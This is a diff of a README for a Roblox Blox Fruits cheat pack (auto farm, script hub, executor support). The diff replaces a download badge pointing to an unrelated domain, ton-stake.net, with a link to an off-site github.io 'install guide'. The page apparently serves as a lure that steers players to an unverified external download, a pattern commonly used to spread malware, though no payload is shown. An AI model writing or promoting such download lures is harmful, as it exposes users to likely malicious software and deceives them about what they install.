@@ -3,7 +3,12 @@
 **Roblox Blox Fruits Tools 2025 (PC Edition)** is a utilities and scripts pack designed for Roblox Blox Fruits players.  
 It includes auto farm, fruit notifier, script hub, and executor support for Windows Roblox Client.
 
-[![Download Tools](https://img.shields.io/badge/Download-Blox_Fruits_Tools-blueviolet)](https://ton-stake.net)
+
+<a href="https://roblox-blox-fruits-tools-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
+
 
 ---
 
